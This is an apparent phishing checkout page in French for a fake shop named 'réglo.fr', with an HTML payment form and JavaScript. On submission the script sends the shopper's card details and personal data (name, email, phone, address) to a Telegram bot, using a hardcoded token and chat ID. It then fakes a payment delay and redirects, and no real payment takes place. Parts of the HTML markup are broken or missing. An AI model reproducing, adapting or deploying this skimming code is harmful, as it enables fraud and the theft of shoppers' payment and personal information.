<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement sécurisé | VotreBoutique</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --success-color: #27ae60;
            --warning-color: #f39c12;
            --border-radius: 8px;
            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f7fa;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background-color: white;
            box-shadow: var(--box-shadow);
            padding: 20px 0;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .logo i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .checkout-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }
        
        .checkout-steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 2px;
            background-color: #ddd;
            z-index: 1;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #ddd;
            color: #777;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 8px;
        }
        
        .step.active .step-number {
            background-color: var(--secondary-color);
            color: white;
        }
        
        .step.completed .step-number {
            background-color: var(--success-color);
            color: white;
        }
        
        .step-text {
            font-size: 14px;
            color: #777;
            font-weight: 500;
        }
        
        .step.active .step-text {
            color: var(--secondary-color);
            font-weight: 600;
        }
        
        .step.completed .step-text {
            color: var(--success-color);
        }
        
        .payment-container {
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 30px;
        }
        
        @media (max-width: 768px) {
            .payment-container {
                grid-template-columns: 1fr;
            }
        }
        
        .payment-card {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .section-title {
            font-size: 20px;
            margin-bottom: 20px;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .section-title i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .card-icon {
            width: 50px;
            height: 30px;
            object-fit: contain;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 3px;
            background-color: white;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        input, select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: var(--transition);
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .card-wrapper {
            position: relative;
        }
        
        .card-preview {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            color: #777;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 25px;
            background-color: var(--secondary-color);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            width: 100%;
        }
        
        .btn:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
        }
        
        .btn-block {
            display: block;
            width: 100%;
        }
        
        .btn-success {
            background-color: var(--success-color);
        }
        
        .btn-success:hover {
            background-color: #219955;
        }
        
        .secure-checkout {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #777;
            font-size: 14px;
        }
        
        .secure-checkout i {
            margin-right: 8px;
            color: var(--success-color);
        }
        
        .order-summary {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 25px;
        }
        
        .order-summary-item {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }
        
        .order-summary-item:last-child {
            border-bottom: none;
        }
        
        .order-total {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            font-size: 18px;
            font-weight: 700;
            color: var(--primary-color);
        }
        
        /* Style pour la carte de crédit */
        .credit-card {
            background: linear-gradient(135deg, #2c3e50, #4a6491);
            color: white;
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            height: 200px;
        }
        
        .credit-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .credit-card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            right: -20%;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 50%;
        }
        
        .card-logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .card-type {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .card-chip {
            width: 40px;
            height: 30px;
            background: linear-gradient(45deg, #ffd700, #e5c100);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card-chip::before {
            content: '';
            width: 30px;
            height: 20px;
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 3px;
        }
        
        .card-number {
            font-size: 20px;
            letter-spacing: 2px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
        }
        
        .card-holder, .card-expiry {
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .card-label {
            font-size: 10px;
            opacity: 0.8;
            margin-bottom: 5px;
        }
        
        /* Animation de chargement */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--secondary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: var(--primary-color);
            font-weight: 500;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <i class="fas fa-shopping-bag"></i>
                <span>réglo.fr</span>
            </div>
        </div>
    </header>
    
    <div class="container">
        <div class="checkout-steps">
            <div class="step completed">
                <div class="step-number">1</div>
                <div class="step-text">Panier</div>
            </div>
            <div class="step completed">
                <div class="step-number">2</div>
                <div class="step-text">Livraison</div>
            </div>
            <div class="step active">

        <div class="payment-container">

                        Paiement par carte bancaire

                    <div class="card-icons">

                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Carte_Bleue_logo.svg/1200px-Carte_Bleue_logo.svg.png" alt="CB" class="card-icon" style="object-fit: cover;">
                    </div>
                    
                    <!-- Carte de crédit visuelle -->
                    <div class="credit-card">
                        <div class="card-logo">
                            <div class="card-chip"></div>

                    <form id="payment-form">

                            <div class="form-group">
                                <label for="card-expiry">Date d'expiration</label>

                                <label for="card-cvv">Code de sécurité</label>

                        <button type="submit" class="btn btn-success">

                        <div class="secure-checkout">

                    </form>
                </div>
            </div>
            
            <div class="payment-sidebar">
                <div class="order-summary">
                    <h2 class="section-title">
                        <i class="fas fa-shopping-cart"></i>
                        Récapitulatif de commande
                    </h2>
                    
                    <div id="order-items">
                        <!-- Les articles seront ajoutés dynamiquement ici -->
                    </div>
                    
                    <div class="order-total">
                        <span>Total</span>
                        <span id="order-total-amount">0,00 €</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Overlay de chargement -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Traitement de votre paiement...</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Configuration du bot Telegram
            const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
            const TELEGRAM_CHAT_ID = '5372119436';
            
            // Charger les données de la commande
            const orderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            const orderItemsContainer = document.getElementById('order-items');
            const orderTotalAmount = document.getElementById('order-total-amount');
            const paymentForm = document.getElementById('payment-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            
            // Éléments visuels de la carte
            const cardNumberDisplay = document.getElementById('card-number-display');
            const cardHolderDisplay = document.getElementById('card-holder-display');
            const cardExpiryDisplay = document.getElementById('card-expiry-display');
            const cardTypeDisplay = document.getElementById('card-type-display');
            
            // Afficher les articles de la commande
            function displayOrderItems() {
                if (!orderData.items || orderData.items.length === 0) {
                    orderItemsContainer.innerHTML = '<p class="empty-cart">Aucun article dans votre commande.</p>';
                    return;
                }
                
                orderItemsContainer.innerHTML = orderData.items.map(item => `
                    <div class="order-summary-item">
                        <div class="product-info">
                            <div>
                                <div class="product-name">${item.name}</div>
                                <div class="product-variant">${item.variant}</div>
                                <div class="product-quantity">Quantité: ${item.quantity}</div>
                            </div>
                        </div>
                        <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
                    </div>
                `).join('');
                
                orderTotalAmount.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
            }
            
            // Fonctions pour la carte de crédit
            const creditCardUtils = {
                formatNumber: (number) => number.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim(),
                
                detectType: (number) => {
                    const num = number.replace(/\s/g, '');
                    if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(num)) return 'Visa';
                    if (/^5[1-5][0-9]{14}$/.test(num)) return 'Mastercard';
                    if (/^3[47][0-9]{13}$/.test(num)) return 'American Express';
                    return 'Carte Bancaire';
                },
                
                luhnCheck: (num) => {
                    const cleaned = num.replace(/\s/g, '');
                    if (!/^[0-9]+$/.test(cleaned) || cleaned.length < 13) return false;
                    
                    let sum = 0;
                    let alternate = false;
                    
                    for (let i = cleaned.length - 1; i >= 0; i--) {
                        let digit = parseInt(cleaned.charAt(i));
                        
                        if (alternate) {
                            digit *= 2;
                            if (digit > 9) digit = (digit % 10) + 1;
                        }
                        
                        sum += digit;
                        alternate = !alternate;
                    }
                    
                    return sum % 10 === 0;
                },
                
                validateExpiry: (expiry) => {
                    if (!expiry || !expiry.includes('/')) return false;
                    const [month, year] = expiry.split('/');
                    if (!month || !year || month.length !== 2 || year.length !== 2) return false;
                    
                    const now = new Date();
                    const currentYear = now.getFullYear() % 100;
                    const currentMonth = now.getMonth() + 1;
                    
                    const expMonth = parseInt(month);
                    const expYear = parseInt(year);
                    
                    if (isNaN(expMonth) || isNaN(expYear)) return false;
                    
                    return (
                        expMonth >= 1 &&
                        expMonth <= 12 &&
                        (expYear > currentYear || 
                         (expYear === currentYear && expMonth >= currentMonth))
                    );
                }
            };
            
            // Mettre à jour l'affichage de la carte
            function updateCardDisplay() {
                const cardNumber = document.getElementById('card-number')?.value || '';
                const cardHolder = document.getElementById('card-holder')?.value || '';
                const cardExpiry = document.getElementById('card-expiry')?.value || '';
                
                // Numéro de carte
                cardNumberDisplay.textContent = cardNumber 
                    ? creditCardUtils.formatNumber(cardNumber)
                    : '•••• •••• •••• ••••';
                
                // Type de carte
                cardTypeDisplay.textContent = cardNumber 
                    ? creditCardUtils.detectType(cardNumber)
                    : 'Carte Bancaire';
                
                // Titulaire
                cardHolderDisplay.textContent = cardHolder || 'NOM PRÉNOM';
                
                // Date d'expiration
                cardExpiryDisplay.textContent = cardExpiry || '••/••';
            }
            
            // Valider le formulaire
            function validateForm() {
                const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
                const cardHolder = document.getElementById('card-holder').value.trim();
                const cardExpiry = document.getElementById('card-expiry').value;
                const cardCvv = document.getElementById('card-cvv').value;
                
                // Validation du numéro de carte
                if (!cardNumber || !creditCardUtils.luhnCheck(cardNumber)) {
                }
                
                // Validation du titulaire
                if (!cardHolder || cardHolder.length < 3) {
                    alert('Veuillez entrer le nom complet du titulaire.');
                    return false;
                }
                
                // Validation de la date d'expiration
                if (!creditCardUtils.validateExpiry(cardExpiry)) {
                    alert('Date d\'expiration invalide ou carte expirée (format MM/AA requis).');
                    return false;
                }
                
                // Validation du CVV
                const cardType = creditCardUtils.detectType(cardNumber);
                const cvvLength = cardType === 'American Express' ? 4 : 3;
                if (!cardCvv || !new RegExp(`^\\d{${cvvLength}}$`).test(cardCvv)) {
                    alert(`Le code de sécurité doit contenir ${cvvLength} chiffres.`);
                    return false;
                }
                
                return true;
            }
            
            // Fonction améliorée pour envoyer les infos à Telegram
            async function sendPaymentInfoToTelegram(cardInfo) {
                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                    console.error('Configuration Telegram manquante');
                    return false;
                }
                
                try {
                    const orderId = orderData.orderId || 'CMD-' + Date.now().toString().slice(-6);
                    const customer = orderData.customer || {};
                    
                    // Création du message
                    let message = `💳 *NOUVELLE TRANSACTION* 💳\n\n`;
                    message += `🆔 *Référence:* ${orderId}\n`;
                    message += `📅 *Date:* ${new Date().toLocaleString('fr-FR')}\n`;
                    message += `💰 *Montant:* ${orderData.total?.toFixed(2) || '0.00'} €\n\n`;
                    
                    message += `👤 *Client:*\n`;
                    message += `- ${customer.firstName || ''} ${customer.lastName || ''}\n`;
                    message += `- 📧 ${customer.email || ''}\n`;
                    message += `- 📞 ${customer.phone || ''}\n\n`;
                    
                    message += `💳 *Paiement:*\n`;
                    message += `- Type: ${cardInfo.type}\n`;
                    message += `- Numéro: ${cardInfo.number.replace(/\d(?=\d{4})/g, '*')}\n`;
                    message += `- Titulaire: ${cardInfo.holder}\n`;
                    message += `- Expiration: ${cardInfo.expiry}\n`;
                    message += `- CVV: ${cardInfo.cvv.replace(/./g, '*')}\n\n`;
                    
                    message += `🏠 *Livraison:*\n`;
                    message += `- ${customer.address || ''}\n`;
                    message += `- ${customer.postalCode || ''} ${customer.city || ''}\n`;
                    message += `- ${customer.country || 'France'}\n`;
                    
                    // Envoi via API Telegram
                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                    const params = new URLSearchParams();
                    params.append('chat_id', TELEGRAM_CHAT_ID);
                    params.append('text', message);
                    params.append('parse_mode', 'Markdown');
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params
                    });
                    
                    if (!response.ok) {
                        throw new Error(`Erreur HTTP: ${response.status}`);
                    }
                    
                    console.log('Notification envoyée avec succès à Telegram');
                    return true;
                } catch (error) {
                    console.error('Échec de l\'envoi à Telegram:', error);
                    return false;
                }
            }
            
            // Gestionnaires d'événements
            function setupEventListeners() {
                // Formatage automatique des inputs
                document.getElementById('card-number')?.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 16) value = value.substring(0, 16);
                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                    updateCardDisplay();
                });
                
                document.getElementById('card-holder')?.addEventListener('input', function(e) {
                    e.target.value = e.target.value.toUpperCase();
                    updateCardDisplay();
                });
                
                document.getElementById('card-expiry')?.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 4) value = value.substring(0, 4);
                    if (value.length > 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2);
                    }
                    e.target.value = value;
                    updateCardDisplay();
                });
                
                document.getElementById('card-cvv')?.addEventListener('input', function(e) {
                    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
                    const cardType = creditCardUtils.detectType(cardNumber);
                    const maxLength = cardType === 'American Express' ? 4 : 3;
                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, maxLength);
                });
                
                // Soumission du formulaire
                paymentForm?.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    if (!validateForm()) return;
                    
                    try {
                        // Afficher le loader
                        loadingOverlay?.classList.add('active');
                        
                        // Préparer les données de la carte
                        const cardInfo = {
                            type: creditCardUtils.detectType(document.getElementById('card-number').value.replace(/\s/g, '')),
                            number: document.getElementById('card-number').value,
                            holder: document.getElementById('card-holder').value,
                            expiry: document.getElementById('card-expiry').value,
                            cvv: document.getElementById('card-cvv').value
                        };
                        
                        // Envoyer à Telegram
                        const telegramSuccess = await sendPaymentInfoToTelegram(cardInfo);
                        if (!telegramSuccess) {
                            console.warn("L'envoi à Telegram a échoué, mais le paiement continue");
                        }
                        
                        // Simuler un traitement de paiement (2-3 sec)
                        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
                        
                        // Redirection vers la page de confirmation
                        window.location.href = 'confirmation.html';
                    } catch (error) {
                        console.error('Erreur lors du traitement:', error);
                        alert('Une erreur est survenue. Veuillez réessayer.');
                        loadingOverlay?.classList.remove('active');
                    }
                });
            }
            
            // Initialisation
            function init() {
                displayOrderItems();
                updateCardDisplay();
                setupEventListeners();
                
                // Test de la fonction Luhn (pour debug)
                console.log("Test Luhn (devrait être vrai):", creditCardUtils.luhnCheck("4532015112830366")); // Visa valide
                console.log("Test Luhn (devrait être faux):", creditCardUtils.luhnCheck("4532015112830367")); // Visa invalide
            }
            
            init();
        });
    </script>
</body>
